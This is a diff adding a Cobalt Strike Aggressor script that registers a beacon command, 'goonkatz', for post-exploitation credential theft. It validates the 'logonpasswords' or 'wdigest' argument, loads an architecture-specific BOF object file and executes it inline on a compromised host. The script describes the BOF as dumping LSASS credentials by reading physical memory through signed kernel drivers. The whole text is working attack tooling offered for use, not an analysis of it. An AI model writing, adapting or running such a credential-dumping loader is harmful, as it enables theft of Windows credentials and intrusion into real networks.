@@ -1,0 +1,48 @@
+#Register command
+beacon_command_register(
+"goonkatz", 
+"Dump credentials from LSASS by using signed kernel drivers to read physical memory.",
+"Synopsis: goonkatz [logonpasswords/wdigest]\n" .
+"Description:\n" .
+"  Dump credentials from LSASS by using signed kernel drivers to read physical memory.\n\n" .
+"Examples:\n" .
+"  goonkatz logonpasswords\n" .
+"  goonkatz wdigest\n"
+);
+
+alias goonkatz {
+    $data = substr($0, 9);
+    @args = split(" ", $data);
+
+	if (size(@_) < 2)
+	{
+		berror($1, "Invalid number of arguments! (See 'help goonkatz')");
+		return -1;
+	}
+	
+	btask($1, "Tasked beacon to inline execute Goonkatz!");
+	$barch = barch($1);
+	$argument = $2;
+	
+    if (($argument ne "logonpasswords") && ($argument ne "wdigest"))
+    {
+        berror($1, "Invalid argument \"$argument\"!");
+        return;
+    }
+
+	# Read BOF file
+	$handle = openf(script_resource("bin/goonkatz. $+ $barch $+ .o"));
+	$bof = readb($handle, -1);
+	closef($handle);
+	if(strlen($bof) < 1)
+	{
+		berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the bin directory");
+		return;
+	}
+
+    println("$argument");
+
+    # Prepare the arguments
+    $args = bof_pack($1, "Z", $argument);
+    beacon_inline_execute($1, $bof, "go", $args); # $args
+}
